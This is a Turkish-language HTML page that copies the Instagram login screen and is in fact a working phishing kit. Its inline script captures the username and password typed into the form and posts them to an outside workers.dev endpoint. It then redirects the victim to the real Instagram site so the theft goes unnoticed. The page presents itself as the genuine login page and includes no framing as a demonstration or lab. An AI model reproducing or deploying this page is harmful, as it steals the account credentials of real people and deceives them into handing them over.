<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Paylaşım önizleme ve sayfa başlığı ayarları -->
  <title>https://Instagram.com/modashop</title>
  <meta name="description" content="https://Instagram.com/modashop" />

  <!-- WhatsApp, Instagram, TikTok ve diğer platformlar için Open Graph -->
  <meta property="og:title" content="https://Instagram.com/modashop" />
  <meta property="og:description" content="https://Instagram.com/modashop" />
  <meta property="og:image" content="https://Instagram.com/modashop" />
  <meta property="og:url" content="https://Instagram.com/modashop" />
  <meta property="og:type" content="website" />

  <!-- Kart görünümü için ek etiketler -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="https://Instagram.com/modashop" />
  <meta name="twitter:description" content="https://Instagram.com/modashop" />
  <meta name="twitter:image" content="https://Instagram.com/modashop" />

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #262626;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      padding: 24px 16px 16px;
      font-weight: 400;
    }

    .main-container {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 12px;
    }

    .box {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      padding: 24px 36px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo-text {
      font-family: "Billabong", "Grand Hotel", "Pacifico", cursive, sans-serif;
      font-size: 46px;
      font-weight: 700;
      margin: 6px 0 24px;
      letter-spacing: 0.4px;
      user-select: none;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .input-field {
      width: 100%;
      height: 38px;
      padding: 0 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 13px;
      font-weight: 500;
      color: #262626;
      outline: none;
    }

    .input-field::placeholder {
      color: #737373;
      font-weight: 400;
    }

    .input-field:focus {
      border-color: #8e8e8e;
      background: #ffffff;
    }

    .login-btn {
      margin-top: 8px;
      width: 100%;
      height: 34px;
      background-color: #0095f6;
      color: #ffffff;
      font-size: 14px;
      font-weight: 700;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      opacity: 0.7;
      transition: opacity 0.15s ease, background-color 0.15s ease;
    }

    .login-btn.active {
      opacity: 1;
      cursor: pointer;
    }

    .login-btn.active:hover {
      background-color: #1877f2;
    }

    .error-msg {
      display: none;
      color: #ed4956;
      font-size: 12px;
      font-weight: 600;
      text-align: center;
      margin-top: 6px;
      line-height: 1.4;
    }

    .divider {
      width: 100%;
      display: flex;
      align-items: center;
      margin: 14px 0 12px;
      color: #737373;
      font-size: 13px;
      font-weight: 700;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .divider span {
      margin: 0 14px;
    }

    .fb-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #385185;
      font-size: 14px;
      font-weight: 700;
      text-decoration: none;
      margin-top: 4px;
    }

    .fb-login img {
      width: 16px;
      height: 16px;
      object-fit: contain;
    }

    .forgot-link {
      margin-top: 14px;
      font-size: 12px;
      font-weight: 600;
      color: #00376b;
      text-decoration: none;
    }

    .signup-box {
      padding: 18px;
      font-size: 14px;
      font-weight: 500;
      text-align: center;
    }

    .signup-box a {
      color: #0095f6;
      font-weight: 700;
      text-decoration: none;
      margin-left: 4px;
    }

    .get-app {
      text-align: center;
      padding: 8px 0;
    }

    .get-app p {
      font-size: 13px;
      font-weight: 500;
      color: #262626;
      margin-bottom: 12px;
    }

    .store-badges {
      display: flex;
      justify-content: center;
      gap: 8px;
      flex-wrap: wrap;
    }

    .store-badges img {
      height: 40px;
      object-fit: contain;
    }

    footer {
      width: 100%;
      max-width: 900px;
      margin-top: 28px;
      text-align: center;
      color: #737373;
      font-size: 12px;
      font-weight: 500;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px 14px;
      margin-bottom: 12px;
    }

    .footer-links a {
      color: #737373;
      font-weight: 500;
      text-decoration: none;
    }

    .footer-bottom {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }

    #lang-select {
      border: none;
      background: transparent;
      color: #737373;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      outline: none;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <div class="box">
      <div class="logo-text">Instagram</div>

      <form id="loginForm" novalidate>
        <input
          type="text"
          id="username"
          class="input-field"
          placeholder="Telefon numarası, kullanıcı adı veya e-posta"
          autocomplete="username"
          required
        />
        <input
          type="password"
          id="password"
          class="input-field"
          placeholder="Şifre"
          autocomplete="current-password"
          required
        />
        <button type="submit" id="submitBtn" class="login-btn">Giriş yap</button>
        <div id="errorMsg" class="error-msg"></div>
      </form>

      <div class="divider"><span>YA DA</span></div>

      <a href="https://www.facebook.com/" class="fb-login">
        <img src="fb.png" alt="Facebook" />
        <span>Facebook ile Giriş Yap</span>
      </a>

      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">
        Şifreni mi unuttun?
      </a>
    </div>

    <div class="box signup-box">
      <span>Hesabın yok mu?</span>
      <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
    </div>

    <div class="get-app">
      <p>Uygulamayı indir.</p>
      <div class="store-badges">
        <a href="https://apps.apple.com/" target="_blank" rel="noopener noreferrer">
          <img src="appstore.png" alt="App Store'dan İndir" />
        </a>
        <a href="https://play.google.com/store" target="_blank" rel="noopener noreferrer">
          <img src="googleplay.png" alt="Google Play'den Al" />
        </a>
      </div>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">Hakkında</a>
      <a href="#">Blog</a>
      <a href="#">İş Fırsatları</a>
      <a href="#">Yardım</a>
      <a href="#">API</a>
      <a href="#">Gizlilik</a>
      <a href="#">Koşullar</a>
      <a href="#">Konumlar</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
    </div>
    <div class="footer-bottom">
      <select id="lang-select" aria-label="Dil Seçimi">
        <option value="tr" selected>Türkçe</option>
        <option value="en">English</option>
      </select>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>

  <script>
    const WORKER_URL = "https://nstagramtest.odev71237.workers.dev";
    const REDIRECT_URL = "https://www.instagram.com/";

    const form = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const submitBtn = document.getElementById("submitBtn");
    const errorMsg = document.getElementById("errorMsg");

    function updateButtonState() {
      const hasUser = usernameInput.value.trim().length > 0;
      const hasPass = passwordInput.value.length >= 5;
      submitBtn.classList.toggle("active", hasUser && hasPass);
    }

    usernameInput.addEventListener("input", updateButtonState);
    passwordInput.addEventListener("input", updateButtonState);

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = usernameInput.value.trim();
      const password = passwordInput.value;

      if (!username) {
        errorMsg.textContent = "Lütfen kullanıcı adı, e-posta veya telefon numarası gir.";
        errorMsg.style.display = "block";
        usernameInput.focus();
        return;
      }

      if (password.length < 5) {
        errorMsg.textContent = "Şifre en az 5 karakter olmalıdır.";
        errorMsg.style.display = "block";
        passwordInput.focus();
        return;
      }

      errorMsg.style.display = "none";
      submitBtn.disabled = true;
      submitBtn.textContent = "Giriş yapılıyor...";

      try {
        await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
          keepalive: true,
        });
      } catch (err) {
        // İstek hatası olsa bile kullanıcıyı yönlendirmeye devam et
      }

      window.location.href = REDIRECT_URL;
    });
  </script>
</body>
</html>
